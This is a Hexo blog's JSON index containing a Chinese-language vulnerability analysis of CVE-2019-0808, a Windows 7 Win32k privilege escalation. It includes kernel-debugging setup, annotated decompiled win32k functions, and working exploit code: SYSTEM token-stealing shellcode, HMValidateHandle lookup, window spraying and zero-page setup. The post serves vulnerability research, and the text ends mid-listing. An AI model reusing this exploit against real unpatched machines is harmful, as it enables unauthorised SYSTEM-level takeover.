{"meta":{"title":"大大黄的博客","subtitle":"lahonja's Blog","description":"网络安全 CTF 内网渗透 取证分析","author":"LAHONJA","url":"http://lahonja.me","root":"/"},"pages":[{"title":"分类","date":"2019-08-05T06:12:03.000Z","updated":"2019-08-05T06:13:52.207Z","comments":true,"path":"categories/index.html","permalink":"http://lahonja.me/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-08-29T06:49:13.000Z","updated":"2020-08-29T06:49:13.973Z","comments":true,"path":"tags/index.html","permalink":"http://lahonja.me/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"CVE-2019-0808详细分析","slug":"CVE-2019-0808详细分析","date":"2019-10-10T00:51:33.000Z","updated":"2019-10-11T03:02:31.369Z","comments":true,"path":"2019/10/10/CVE-2019-0808详细分析/","link":"","permalink":"http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/","excerpt":"准备工作windbg调试本次调试环境为Win7 x86 sp1，使用windbg需要安装SDK。另外要注意的是，新安装的系统的win32k.sys版本为6.1.7601.17514，本文分析的win32k.sys版本为6.1.7601.23591。下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=8279 点击下载DLL及pdb、IDA注释文件 win8/win10可以在应用商店安装windbg preview，并配合 VirtualKD 进行双机调试 :) 传送门VirtualKD 中调试器路径选择自定义，地址为： 1C:\\Users\\jack\\AppData\\Local\\Microsoft\\WindowsApps\\WinDbgX.exe /k com:pipe,resets=0,reconnect,port=$(pipename) 注意不是windbg preview安装后的EXE目录： 1C:\\Program Files\\WindowsApps\\Microsoft.WinDbg_1.1910.3003.0_neutral__8wekyb3d8bbwe\\DbgX.Shell.exe 另外 IDA 7.0 如果不自动下载PDB符号，需要将cfg/pdb.cfg中的相关注释去掉，并建立相应文件夹，另外需要vc runtime 2010运行库（是个坑）。 开启内核调试首先在系统变量中设置符号表服务器系统变量： 1_NT_SYMBOL_PATH=SRV*C:\\WINDOWS\\Symbols*http://msdl.microsoft.com/download/symbols 进入kernel-mode debugging (kd&gt; or lkd&gt;)调试模式，首先命令行运行 1bcdedit /debug on 重启，再打开windbg，即可通过快捷键 Ctrl+K ，或者以下菜单路径，进入内核调试模块： 1WinDbg File&gt;Kernel Debugging&gt;Local&gt;Ok","text":"准备工作windbg调试本次调试环境为Win7 x86 sp1，使用windbg需要安装SDK。另外要注意的是，新安装的系统的win32k.sys版本为6.1.7601.17514，本文分析的win32k.sys版本为6.1.7601.23591。下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=8279 点击下载DLL及pdb、IDA注释文件 win8/win10可以在应用商店安装windbg preview，并配合 VirtualKD 进行双机调试 :) 传送门VirtualKD 中调试器路径选择自定义，地址为： 1C:\\Users\\jack\\AppData\\Local\\Microsoft\\WindowsApps\\WinDbgX.exe /k com:pipe,resets=0,reconnect,port=$(pipename) 注意不是windbg preview安装后的EXE目录： 1C:\\Program Files\\WindowsApps\\Microsoft.WinDbg_1.1910.3003.0_neutral__8wekyb3d8bbwe\\DbgX.Shell.exe 另外 IDA 7.0 如果不自动下载PDB符号，需要将cfg/pdb.cfg中的相关注释去掉，并建立相应文件夹，另外需要vc runtime 2010运行库（是个坑）。 开启内核调试首先在系统变量中设置符号表服务器系统变量： 1_NT_SYMBOL_PATH=SRV*C:\\WINDOWS\\Symbols*http://msdl.microsoft.com/download/symbols 进入kernel-mode debugging (kd&gt; or lkd&gt;)调试模式，首先命令行运行 1bcdedit /debug on 重启，再打开windbg，即可通过快捷键 Ctrl+K ，或者以下菜单路径，进入内核调试模块： 1WinDbg File&gt;Kernel Debugging&gt;Local&gt;Ok 远程调试：被调试机： .server tcp:port=5005调试者机： tcp:Port=5005,Server=192.168.227.130 加载指定模块的符号lm 查看加载模块（win32k必须加载）.reload 重新加载模块!lmi win32k 查看win32k模块导入信息，pdb是否加载 ld win32k 或者 .reload /f win32k.sys 手工加载win32k模块的符号 x win32k!DragOver 以通配符搜索win32k模块中的符号 1234567lkd&gt; dt win32k!tag*Menu* win32k!tagMENUSTATE win32k!tagMENU win32k!tagPOPUPMENU win32k!tagMENULIST win32k!tagUAHMENUPOPUPMETRICS win32k!tagUAHMENUITEMMETRICS 相关参考文档网上能够找到的较好的文章：关于EXP中构造条件的算法分析原作者exodusintel的分析原作者分析的翻译 研究人员通过补丁对比，发现Win32k!xxxMNSetGapState函数，可以在内核态下达到任意地址读写： 反向流程分析xxxMNSetGapState xxxMNUpdateDraggingInfo xxxMNMouseMove xxxHandleMenuMessages xxxCallHandleMenuMessages xxxMNDragOver NtUserMNDragOver正向流程分析NtUserMNDragOver这里主要分析从用户态的 User32!NtUserMNDragOver 调用到内核态的 Win32k!NtUserMNDragOver ，并由 Win32k!NtUserMNDragOver 调用 Win32k!xxxMNDragOver。整个漏洞的利用链是从 User32!NtUserMNDragOver 开始的： 可以看到 NtUserMNDragOver 在这里调用了[7FFE0300]中存放的地址77C270B0： 接下来，看看调用的77C270B0位置处的函数到底是什么： 可以看到，77C270B0位置正是 ntdll!KiFastSystemCall 的地址，从ntdll.dll的导出函数也可以看到： 在NtUserMNDragOver中， call ntdll!KiFastSystemCall 之前，将0x11ED放入了eax，而0x11ED就是进入KiFastSystemCall后，内核调用的系统服务函数号，Windows 7 x86/Windows 7 SP1 x86 系统中0x11ED系统服务函数号对应的函数就是NtUserMNDragOver： Win32k!NtUserMNDragOver 调用 Win32k!xxxMNDragOver： xxxMNDragOver xxxCallHandleMenuMessages xxxHandleMenuMessages xxxMNMouseMove xxxMNUpdateDraggingInfo xxxMNSetGapState EXP流程Shellcode在内核中，进程是靠EPROCESS来识别的。每个进程都有一个 EPROCESS 结构，里面保存着进程的各种信息，和相关结构的指针。EPROCESS结构体定义如下，其中有一项为EX_FAST_REF Token，偏移为0xf8（后面的Shellcode会用到这个偏移）。 EPROCESS 结构位于系统地址空间，所以访问这个结构需要有ring0的权限。如下Shellcode的作用，就是遍历系统中的进程，找到进程ID为4的进程，将其进程token复制给当前进程。当然这段shellcode也需要在ring0下运行。 12345678910111213141516171819202122232425262728__declspec(noinline) int Shellcode()&#123; // https://www.abatchy.com/2018/01/kernel-exploitation-2#token-stealing-payload-windows-7-x86-sp1. // 1. _KPRCB中找到对应当前线程的 _KTHREAD结构体. // 2. _KTHREAD中找到对应当前进程的_EPROCESS结构体, // 3. 在_EPROCESS查找带有PID = 4的进程（uniqueProcessId = 4）; 该\"System\"进程SID == NT AUTHORITY\\SYSTEM SID // 4. 检索那进程的令牌地址 // 5. 对应我们想要提权的进程中找到_EPROCESS. // 6. 用System进程的令牌替换进程的Token. __asm &#123; xor eax, eax // Set EAX to 0. mov eax, DWORD PTR fs : [eax + 0x124] // Get nt!_KPCR.PcrbData. // _KTHREAD is located at FS:[0x124] mov eax, [eax + 0x50] // Get nt!_KTHREAD.ApcState.Process mov ecx, eax // Copy current process _EPROCESS structure xor edx, edx // Set EDX to 0. mov DWORD PTR[ecx + 0x124], edx // Set the JOB pointer in the _EPROCESS structure to NULL. mov edx, 0x4 // Windows 7 SP1 SYSTEM process PID = 0x4 SearchSystemPID: mov eax, [eax + 0B8h] // Get nt!_EPROCESS.ActiveProcessLinks.Flink sub eax, 0B8h cmp[eax + 0B4h], edx // Get nt!_EPROCESS.UniqueProcessId jne SearchSystemPID // 遍历所有的 _EPROCESS 结构体，找到进程ID为4的system进程 mov edx, [eax + 0xF8] // Get SYSTEM process nt!_EPROCESS.Token mov[ecx + 0xF8], edx // Assign SYSTEM process token. &#125;&#125; 进入ring0 参考：bServerSideWindowProc详情传送门 通过上面的Shellcode，可以修改任意进程的Token，从而达到提权，但是Shellcode也是需要在ring0下才能正常运行的，所以要找到一个在ring0下运行它的方法。这里要用到的是通过WNDCLASSEXW创建的窗口，都可以指定一个窗口消息处理函数lpfnWndProc，当然这是正常的使用方法，但是每个WNDCLASSEXW实例，在内核中都有对应的tagWND结构， 这个结构中有一个重要的标识： bServerSideWindowProc 。如果bServerSideWindowProc为1，则系统调用窗口消息处理函数lpfnWndProc时，将会以内核权限执行lpfnWndProc。 123456789101112kd&gt; dt win32k!tagWND +0x000 head : _THRDESKHEAD +0x014 state : Uint4B +0x014 bHasMeun : Pos 0, 1 Bit ... +0x014 bServerSideWindowProc : Pos 18, 1 Bit +0x014 bAnsiWindowProc : Pos 19, 1 Bit +0x014 bBeingActivated : Pos 20, 1 Bit ... +0x014 bMaximizesToMonitor : Pos 30, 1 Bit +0x014 bDestroyed : Pos 31, 1 Bit ... +0x060 lpfnWndProc : Ptr32 long 当然要想修改这个标识，也需要在内核态下才能修改，这里就利用了最开始提到的Win32k!xxxMNSetGapState。（然而并不是那么简单） lpfnWndProc中执行Shellcode这里主要是通过汇编来判断寄存器中cs（代码段寄存器的值），一般当cs的值为0x1b时，代码是在用户态下运行，否则是在内核态下运行。 123456789101112131415161718192021222324252627282930LRESULT CALLBACK sprayWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)&#123; if (uMsg == WM_ENTERIDLE) &#123; printf(\"[+] sprayWndProc WM_ENTERIDLE message\\n\"); WORD um = 0; __asm &#123; // Grab the value of the CS register and // save it into the variable UM. mov ax, cs mov um, ax &#125; // If UM is 0x1B, this function is executing in usermode // code and something went wrong. Therefore output a message that // the exploit didn't succeed and bail. if (um == 0x1b) &#123; // USER MODE printf(\"[!] Exploit didn't succeed, entered sprayWndProc with user mode privileges.\\r\\n\"); ExitProcess(-1); // Bail as if this code is hit either the target isn't vulnerable or something is wrong with the exploit. &#125; else &#123; success = TRUE; // Set the success flag to indicate the sprayWndProc() window procedure is running as SYSTEM. Shellcode(); // Call the Shellcode() function to perform the token stealing and // to remove the Job object on the Chrome render process. &#125; &#125; return DefWindowProc(hWnd, uMsg, wParam, lParam);&#125; 调用HMValidateHandle获取tagWNDWindows的HMValidateHandle函数，可以获取指定窗口句柄的THRDESKHEAD结构，而此结构的pSelf成员就是tagWND的内存地址。但是HMValidateHandle函数并未在dll中导出，所以不能直接调用，需要通过在user32.dll中特定位置搜索函数调用的标识来找到这个函数的地址。 1234567891011121314151617181920212223242526272829303132333435363738394041424344BOOL findHMValidateHandleAddress(HMODULE hUser32) &#123; // HMValidateHandle() 函数未在user32.dll中导出， // 在 IsMenu 函数中有对 HMValidateHandle 的调用，调用的汇编指令 call 对应的机器码为 \\xEB BYTE * pIsMenuFunction = (BYTE *)GetProcAddress(hUser32, \"IsMenu\"); if (pIsMenuFunction == NULL) &#123; printf(\"[!] Failed to find the address of IsMenu within user32.dll.\\r\\n\"); return FALSE; &#125; else &#123; printf(\"[*] pIsMenuFunction: 0x%08X\\r\\n\", (DWORD)pIsMenuFunction); &#125; // 遍历内存 unsigned int offsetInIsMenuFunction = 0; BOOL foundHMValidateHandleAddress = FALSE; for (unsigned int i = 0; i &lt; 0x1000; i++) &#123; BYTE* pCurrentByte = pIsMenuFunction + i; if (*pCurrentByte == 0xE8) &#123; offsetInIsMenuFunction = i + 1; break; &#125; &#125; if (offsetInIsMenuFunction == 0) &#123; printf(\"[!] Couldn't find offset to HMValidateHandle within IsMenu.\\r\\n\"); return FALSE; &#125; printf(\"[*] hUser32: 0x%08X\\r\\n\", (DWORD)hUser32); unsigned int relativeAddressBeingCalledInIsMenu = *(unsigned int *)(pIsMenuFunction + offsetInIsMenuFunction); printf(\"[*] relativeAddressBeingCalledInIsMenu: 0x%08X\\r\\n\", relativeAddressBeingCalledInIsMenu); unsigned int addressOfIsMenuFromStartOfUser32 = ((unsigned int)pIsMenuFunction - (unsigned int)hUser32); printf(\"[*] addressOfIsMenuFromStartOfUser32: 0x%08X\\r\\n\", addressOfIsMenuFromStartOfUser32); unsigned int offset = addressOfIsMenuFromStartOfUser32 + relativeAddressBeingCalledInIsMenu; printf(\"[*] offset: 0x%08X\\r\\n\", offset); // 跳过11个字节的NOP指令 // 注意： Windows 10 以上 没有 NOP 指令，不需要 + 11 pHmValidateHandle = (lHMValidateHandle)((unsigned int)hUser32 + offset + 11); printf(\"[*] pHmValidateHandle: 0x%08X\\r\\n\", (DWORD)pHmValidateHandle); return TRUE;&#125; 窗口喷射 找到两个内核中tagWND靠的比较近的，通过修改上一个窗口的cbWndExtra字段，从而前一个窗口的附加数据可以覆盖后一个窗口的bServerSideWindowProc标识。 上面提到了，修改了这个标识，就可以让窗口的消息处理函数，以内核态进行运行。但是我们回过头去看xxxMNSetGapState，这里对任意地址的写入，只能是|=0x40000000。所以通过这里来精准的修改bServerSideWindowProc标识为1，是个不太现实的方法。所以这里又引入了窗口喷射，通过xxxMNSetGapState修改前一个窗口的cbWndExtra为0x40000000，从而控制后面窗口的数据。 1234567if ( a4 )&#123; v6[1] |= 0x40000000u; if ( !v8 ) goto LABEL_17; *(_DWORD *)(v8 + 4) |= 0x80000000;&#125; WNDCLASSEXA.cbWndExtra 是窗口的附加数据大小，正常使用是注册窗口时指定，是系统自动分配的内存。在WNDCLASSEXA注册实例的内核对象tagWND末尾，偏移为0xB0。 123456789101112131415161718192021lkd&gt; dt win32k!tagWNDwin32k!tagWND +0x000 head : _THRDESKHEAD +0x014 state : Uint4B +0x014 bHasMeun : Pos 0, 1 Bit +0x014 bHasVerticalScrollbar : Pos 1, 1 Bit ... +0x014 bHasCreatestructName : Pos 17, 1 Bit +0x014 bServerSideWindowProc : Pos 18, 1 Bit // 通过后一个窗口的SetWindowTextA修改strName指向的这个标识 ... +0x074 spmenuSys : Ptr32 tagMENU +0x078 spmenu : Ptr32 tagMENU ... +0x084 strName : _LARGE_UNICODE_STRING //通过前一个窗口SetWindowLongA，覆盖第二个窗口的strName指针 +0x090 cbwndExtra : Int4B //通过xxxMNSetGapState修改它为0x40000000 +0x094 spwndLastActive : Ptr32 tagWND +0x098 hImc : Ptr32 HIMC__ +0x09c dwUserData : Uint4B ... +0x0a8 spwndClipboardListenerNext : Ptr32 tagWND +0x0ac ExStyle2 : Uint4B hPrimaryWindow窗口的tagWND对象，cbWndExtra覆盖前后WNDCLASSEXA结构的对比： 窗口喷射主要是创建非常多的窗口，来获取窗口的tagWND，找到tagWND的地址靠的比较近的2个窗口。将需要通过xxxMNSetGapState修改的地址保存到addressToWrite，也就是hPrimaryWindow的tagWND.cbwndExtra，偏移为tagWND+0x90。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283bool sprayWindows() &#123; HWND hwndSprayHandleTable[0x100]; WNDCLASSEXW sprayClass = &#123; 0 &#125;; sprayClass.cbSize = sizeof(WNDCLASSEXW); sprayClass.lpszClassName = TEXT(\"_rand_str_sprayWindowClass\"); sprayClass.lpfnWndProc = sprayWndProc; if (RegisterClassExW(&amp;sprayClass) == 0) &#123; printf(\"[!] Couldn't register the sprayClass class!\\r\\n\"); return FALSE; &#125; // 创建 0x100 个窗口 for (int i = 0; i &lt; 0x100; i++) &#123; hwndSprayHandleTable[i] = CreateWindowExW(0, sprayClass.lpszClassName, TEXT(\"spray\"), 0, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, NULL, NULL); &#125; // 遍历每一个窗口句柄 for (int x = 0; x &lt; 0x100; x++) &#123; // 通过 HmValidateHandle 获取载体窗口对象的 tagWND 内核地址 // 窗口对象 tagWND 的头部结构是一个 THRDESKHEAD 成员结构体对象 THRDESKHEAD *firstEntryDesktop = (THRDESKHEAD *)pHmValidateHandle(hwndSprayHandleTable[x], TYPE_WINDOW); // 其中结构体 DESKHEAD 的成员域 pSelf 指向所属用户对象的内核首地址 // 因此通过该指针加上 tagWND 结构体的大小定位到当前窗口对象的扩展区域的内核地址 unsigned int firstEntryAddress = (unsigned int)firstEntryDesktop-&gt;pSelf; for (int y = 0; y &lt; 0x100; y++) &#123; if (x == y) &#123; // 跳过和自己的比较 continue; &#125; THRDESKHEAD *secondEntryDesktop = (THRDESKHEAD *)pHmValidateHandle(hwndSprayHandleTable[y], TYPE_WINDOW); unsigned int secondEntryAddress = (unsigned int)secondEntryDesktop-&gt;pSelf; if (firstEntryAddress &gt; secondEntryAddress) &#123; if ((firstEntryAddress - secondEntryAddress) &lt; 0x3fd00) &#123; printf(\"[*] Primary window address: 0x%08X\\r\\n\", secondEntryAddress); printf(\"[*] Secondary window address: 0x%08X\\r\\n\", firstEntryAddress); hPrimaryWindow = hwndSprayHandleTable[y]; primaryWindowAddress = secondEntryAddress; hSecondaryWindow = hwndSprayHandleTable[x]; secondaryWindowAddress = firstEntryAddress; break; &#125; &#125; else &#123; if ((secondEntryAddress - firstEntryAddress) &lt; 0x3fd00) &#123; printf(\"[*] Primary window address: 0x%08X\\r\\n\", firstEntryAddress); printf(\"[*] Secondary window address: 0x%08X\\r\\n\", secondEntryAddress); hPrimaryWindow = hwndSprayHandleTable[x]; primaryWindowAddress = firstEntryAddress; hSecondaryWindow = hwndSprayHandleTable[y]; secondaryWindowAddress = secondEntryAddress; break; &#125; &#125; &#125; if (hPrimaryWindow != NULL) &#123; printf(\"[*] Found target windows!\\r\\n\"); break; &#125; &#125; if (hPrimaryWindow == NULL) &#123; printf(\"[!] Couldn't find the right windows for the tagWND primitive. Exiting....\\r\\n\"); return FALSE; &#125; // Set addressToWrite to primaryWindow's cbwndExtra field. addressToWrite = (UINT)primaryWindowAddress + 0x90; // 确保第二个窗口是正常的 if (SetWindowTextW(hSecondaryWindow, L\"test second\") == 0) &#123; printf(\"[!] Something is wrong, couldn't initialize the text buffer in the secondary window....\\r\\n\"); return FALSE; &#125; else &#123; return TRUE; &#125;&#125; xxxMNUpdateDraggingInfo条件构造 0x34 =&gt; addressToWriteTo0x4c =&gt; secondAddress0x50 =&gt; 0xFFFF… 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120int __stdcall xxxMNUpdateDraggingInfo(tagMENUSTATE *pMENUSTATE, int a2, int uDraggingIndex)&#123; tagMENUSTATE *pMENUSTATE_; // esi int *pfnid; // edi unsigned int v5; // ecx int v6; // ST0C_4 int ptagMenuWND; // eax tagPOPUPMENU *pPOPUPMENU; // ebx tagITEM *pItem; // eax int a_minus_num; // ecx unsigned int unkown_value; // edx int fnid_2; // ecx int v13; // eax bool v14; // zf BOOL v15; // eax int v17; // [esp+8h] [ebp-14h] unsigned int v18; // [esp+Ch] [ebp-10h] int fnid; // [esp+14h] [ebp-8h] int uIndex; // [esp+18h] [ebp-4h] UINT uDraggingFlags_; // [esp+24h] [ebp+8h] tagITEM *pItem_copy; // [esp+28h] [ebp+Ch] pMENUSTATE_ = pMENUSTATE; pfnid = (int *)&amp;pMENUSTATE-&gt;uDraggingHitArea; v5 = pMENUSTATE-&gt;uDraggingHitArea; v17 = *((_DWORD *)gptiCurrent + 45); *((_DWORD *)gptiCurrent + 45) = &amp;v17; v18 = v5; if ( v5 ) ++*(_DWORD *)(v5 + 4); fnid = *pfnid; uIndex = pMENUSTATE-&gt;uDraggingIndex; uDraggingFlags_ = pMENUSTATE-&gt;uDraggingFlags &amp; 3; LockMFMWFPWindow(pfnid, a2); v6 = *pfnid; pMENUSTATE_-&gt;uDraggingIndex = uDraggingIndex; if ( !IsMFMWFPWindow(v6) || (ptagMenuWND = safe_cast_fnid_to_PMENUWND(*pfnid)) == 0 ) &#123; *pfnid = 0; pMENUSTATE_-&gt;uDraggingIndex = -1; return ThreadUnlock1(); &#125; pPOPUPMENU = *(tagPOPUPMENU **)(ptagMenuWND + 0xB0); pItem = MNGetpItem(*(tagPOPUPMENU **)(ptagMenuWND + 0xB0), pMENUSTATE_-&gt;uDraggingIndex);// // pItem = MNGetpItem(pPOPUPMENU, a3); pMENUSTATE_-&gt;uDraggingFlags = 0; pItem_copy = pItem; if ( pItem ) &#123; // pPOPUPMENU-&gt;spmenu = NULL // MNGetpItemFromIndex的第二个参数为*(DOWRD*)0x4C // 为了让MNGetpItemFromIndex返回值为方便控制的地址，我们希望它返回在零页面地址上 // 从而轻松的控制这里判断中参与运算的一部分，内部返回值计算为： // result = *(_DWORD *)(null + 0x34) + 0x6C * uIndex; // 这里我们希望返回为0x100000180，由于只有4字节，最高位的1会去掉，从而变成0x180。-&gt;yItem 再取+0x28偏移处的值。 // 所以我们0x4C的值应该满足 (*(DWORD*)0x34) + (*(DWORD*)0x4C)*0x6C = 0x100000180 // 也就是代码中的 // UINT secondAddress = ((0x100000180 - addressToWriteTo) / 0x6C); // 为什么不控制成其他的值呢？比如让其返回为0，如果这样，则 // UINT secondAddress = (( - addressToWriteTo) / 0x6C); // 从而让-&gt;yItem取0x28偏移处的值（secondAddress就成了负数，不可以） a_minus_num = MNGetpItemFromIndex(pPOPUPMENU-&gt;spmenu, pPOPUPMENU-&gt;spmenu-&gt;iTop)-&gt;yItem + pMENUSTATE_-&gt;ptMouseLast.y - *(_DWORD *)(*pfnid + 0x54); // // pPOPUPMENU-&gt;spmenu = NULL // pPOPUPMENU-&gt;spmenu-&gt;iTop = *(DWORD*)0x4C =&gt; secondAddress // MNGetpItemFromIndex(pPOPUPMENU-&gt;spmenu, pPOPUPMENU-&gt;spmenu-&gt;iTop)-&gt;yItem = *(DWORD*)(0x180+0x28) = 0xf0f0f0f0 （负数还是很大的整数？） // ((pMenuState-&gt;ptMouseLast.y - pMenuState-&gt;uDraggingHitArea-&gt;rcClient.top) + pItemFromIndex-&gt;yItem) &gt; (pItem-&gt;yItem + SYSMET(CYDRAG)) unkown_value = pItem_copy-&gt;yItem; // 通过构造条件，始终进入分支 pMENUSTATE_-&gt;uDraggingFlags = 1; // 这里要注意的是，原作者和网上都是分析的，0xf0f0f0f0是个足够大的数， // 从而始终可以进入pMENUSTATE_-&gt;uDraggingFlags = 2;分支 // 然而我测试了将 0x50 后的内存分别覆盖为0xff，0x7f，0x80，0x00， // 0x7f也是足够的的整数了，所以这里其实是有符号整数比较，0x7f不行的原因就是太大了，进入了=2的分支。 // 0xff，0x7f，0x00可以，是因为是负数，或者足够小！ if ( a_minus_num &gt; (signed int)(unkown_value + *(_DWORD *)(gpsi + 0x6E4)) )// &#123; if ( a_minus_num &gt;= (signed int)(unkown_value + pItem_copy-&gt;cyItem - *(_DWORD *)(gpsi + 0x6E4)) ) pMENUSTATE_-&gt;uDraggingFlags = 2; &#125; else &#123; pMENUSTATE_-&gt;uDraggingFlags = 1; // // pMENUSTATE_-&gt;uDraggingFlags 不能为0，为0则进入xxxMNSetGapState后不能进行或运算 // 通过测试0x4C处的值，发现构造的比较值是个较小的数或负数，从而始终进入这个分支 &#125; &#125; fnid_2 = fnid; if ( fnid != *pfnid ) goto LABEL_22; v13 = pMENUSTATE_-&gt;uDraggingIndex - uIndex; if ( v13 == -1 ) &#123; if ( pMENUSTATE_-&gt;uDraggingFlags == 2 &amp;&amp; uDraggingFlags_ == 1 ) return ThreadUnlock1(); v15 = 1; goto LABEL_20; &#125; if ( pMENUSTATE_-&gt;uDraggingIndex == uIndex ) &#123; v15 = uDraggingFlags_ != pMENUSTATE_-&gt;uDraggingFlags;LABEL_20: v14 = v15 == 0; goto LABEL_21; &#125; if ( v13 != 1 || pMENUSTATE_-&gt;uDraggingFlags != 1 ) goto LABEL_22; v14 = uDraggingFlags_ == 2;LABEL_21: if ( !v14 ) &#123;LABEL_22: pMENUSTATE_-&gt;uDraggingFlags |= 4u; // 第四个参数为0，不能进入或运算 xxxMNSetGapState(fnid_2, uIndex, uDraggingFlags_, 0); // 第四个参数为1，才能进入里面的或运算 xxxMNSetGapState(*pfnid, pMENUSTATE_-&gt;uDraggingIndex, pMENUSTATE_-&gt;uDraggingFlags, 1); &#125; return ThreadUnlock1();&#125; windbg调试证明也是进入的pMENUSTATE_-&gt;uDraggingFlags = 1;分支： MNGetpItemFromIndex条件构造 0x20 =&gt; 0xFFFFFFFF 123456789101112131415161718192021222324int __stdcall MNGetpItem(int a1, int a2)&#123; int result; // eax result = a1; if ( a1 ) result = MNGetpItemFromIndex(*(_DWORD *)(a1 + 0x14), a2); return result;&#125;tagITEM *__stdcall MNGetpItemFromIndex(tagMENU *pMENU, unsigned int uIndex)&#123; tagITEM *result; // eax if ( uIndex == -1 || uIndex &gt;= pMENU-&gt;cItems )// // 为了不让每次的返回结果为0，让uIndex和最大的UINT比较，始终进入else分支 // pMENU-&gt;cItems = *(DWORD*)0x20 = 0xffffffff result = 0; else result = &amp;pMENU-&gt;rgItems[uIndex]; // // result = *(_DWORD *)(null + 0x34) + 0x6C * uIndex; // 注意这里返回的是0x34中的值 +0x6C*uIndex // 所以往0x34中放入主窗口的cbwndExtra偏移时，要-0x6C*uIndex return result;&#125; 条件构造代码123456789101112131415161718192021222324252627282930313233343536373839404142// xxxMNUpdateDraggingInfo 函数获得窗口对象后，会通过 MNGetpItem 函数访问其成员 tagPOPUPMENU 对象。// MNGetpItem 函数又会继续访问 tagPOPUPMENU 对象的 spmenu 成员，从而造成零指针解引用漏洞。LRESULT WINAPI SubMenuProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)&#123; if (msg == WM_MN_FINDMENUWINDOWFROMPOINT) &#123; // 拦截 MN_FINDMENUWINDOWFROMPOINT 消息, 返回触发漏洞的 hWndFakeWindow printf(\"[*] In WM_MN_FINDMENUWINDOWFROMPOINT handler...\\r\\n\"); printf(\"[*] Update window[%p] proc to DefWindowProc \\n\", hwnd); SetWindowLongW(hwnd, GWLP_WNDPROC, (ULONG)DefWindowProc); UINT uIndex = wParam + 0x10; // 这里没弄清楚是在哪里要减0x10，导致这里要加上去 UINT addressToWriteTo = ((addressToWrite + 0x6C) - (uIndex * 0x6C) - 0x4); // 由于写入地址会先在MNGetpItemFromIndex中进行运算，将参与运算的写入地址进行相应的计算 // // -0x4，是由于xxxMNSetGapState函数进行运算时，会取fState的偏移+0x4 // pItem_copy-&gt;fState |= 0x40000000u; =&gt; *((DWORD*)pItem_copy + 0x4) |= 0x40000000u // // -(uIndex * 0x6C)，是由于MNGetpItemFromIndex返回的是0x34中的地址+0x6C*uIndex // result = *(_DWORD *)(null + 0x34) + 0x6C * uIndex; // // +0x6C 是因为在xxxMNSetGapState中，调用MNGetpItem时，对uIndex减了1 // ptagITEM_2 = MNGetpItem(spPopupMenu_1, uIndex - 1); memcpy_s((void*)0x20, 4, \"\\xFF\\xFF\\xFF\\xFF\", 4); // MNGetpItemFromIndex中，为了不让每次的返回结果为0，让uIndex和最大的UINT比较，始终进入else分支 memcpy_s((void*)0x34, 4, &amp;addressToWriteTo, 4); // xxxMNSetGapState中第一次调用MNGetpItem，返回运算地址，就是从0x34中取出来进行运算的 UINT secondAddress = ((0x100000180 - addressToWriteTo) / 0x6C); memcpy_s((void*)0x4C, 4, &amp;secondAddress, 4); // 不设置也可以，默认为0，也很小 memset((void*)0x1A8, 0xff, 0x4); // 设置成为负数 (0x180+0x28) // 替换窗口句柄为触发漏洞的窗口 printf(\"[+] Replace the window handle to fakewindow\\n\"); // 拦截WM_MN_FINDMENUWINDOWFROMPOINT消息，将窗口的句柄替换为没有菜单的利用窗口 return (ULONG)hWndFakeWindow; &#125; return DefWindowProc(hwnd, msg, wParam, lParam);&#125; 零页面内存分布 MNGetpItem老版本 xxxMNSetGapState调用之前，会先调用MNGetpItem， 这里要注意的是，在早期的win32k.sys中，MNGetpItem是直接实现逻辑的，而后来更新的版本，又将逻辑封装到了 MNGetpItemFromIndex 函数中。 MNGetpItem 老版本代码： 1234567891011int __stdcall MNGetpItem(int a1, unsigned int a2)&#123; int v2; // ecx int result; // eax if ( a1 &amp;&amp; (v2 = *(_DWORD *)(a1 + 0x14), a2 &lt; *(_DWORD *)(v2 + 0x20)) ) result = *(_DWORD *)(v2 + 0x34) + 0x6C * a2; else result = 0; return result;&#125; 分析整理后的MNGetpItem代码（没有封装到MNGetpItemFromIndex函数）： 123456789101112131415tagITEM *__stdcall MNGetpItem(tagPOPUPMENU *spPopupMenu, unsigned int pPopupMenu)&#123; tagMENU *spTagMenu; // ecx 重点：漏洞触发时， spPopupMenu-&gt;spmenu 为NULL // pPopupMenu的值通过HOOK修改为0？ tagITEM *result; // eax if ( spPopupMenu &amp;&amp; (spTagMenu = spPopupMenu-&gt;spmenu, pPopupMenu &lt; spTagMenu-&gt;cItems) ) result = ((tagMENU*)&amp;spTagMenu[pPopupMenu])-&gt;rgItems; // result = *((DWORD*)spTagMenu + 0x34) + pPopupMenu * 0x6C; // spTagMenu-&gt;rgItems为 +0x34的偏移， [pPopupMenu] 为 +0x6C * pPopupMenu，而tagMENU结构体的大小正是0x6C。 // 最终返回的是0x34内存中的值 else result = 0; return result;&#125; C语言默认情况下结构体是4字节对齐，可以算出tagMENU的大小为0x6C。相关结构体定义如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798lkd&gt; dt tagMENUwin32k!tagMENU +0x000 head : _PROCDESKHEAD +0x014 fFlags : Uint4B +0x018 iItem : Int4B +0x01c cAlloced : Uint4B +0x020 cItems : Uint4B +0x024 cxMenu : Uint4B +0x028 cyMenu : Uint4B +0x02c cxTextAlign : Uint4B +0x030 spwndNotify : Ptr32 tagWND +0x034 rgItems : Ptr32 tagITEM +0x038 pParentMenus : Ptr32 tagMENULIST +0x03c dwContextHelpId : Uint4B +0x040 cyMax : Uint4B +0x044 dwMenuData : Uint4B +0x048 hbrBack : Ptr32 HBRUSH__ +0x04c iTop : Int4B +0x050 iMaxTop : Int4B +0x054 dwArrowsOn : Pos 0, 2 Bits +0x058 umpm : tagUAHMENUPOPUPMETRICSlkd&gt; dt tagUAHMENUPOPUPMETRICSwin32k!tagUAHMENUPOPUPMETRICS +0x000 rgcx : [4] Int4B +0x010 fUpdateMaxWidths : Pos 0, 1 Bitlkd&gt; dt tagITEMwin32k!tagITEM 